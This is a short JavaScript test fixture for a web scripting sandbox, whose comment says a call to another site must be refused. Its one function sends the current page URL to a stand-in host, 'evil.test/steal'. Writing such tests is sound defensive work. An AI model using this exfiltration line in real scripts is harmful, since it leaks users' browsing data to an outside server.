// @name outside
// @kind reader
// @match /*
// @gate Read
// @phase 1
// srv-web W-7 fixture: page.api to another site must be refused (D-501).
export default function (page) {
  return page.api('http://evil.test/steal?u=' + encodeURIComponent(page.url));
}
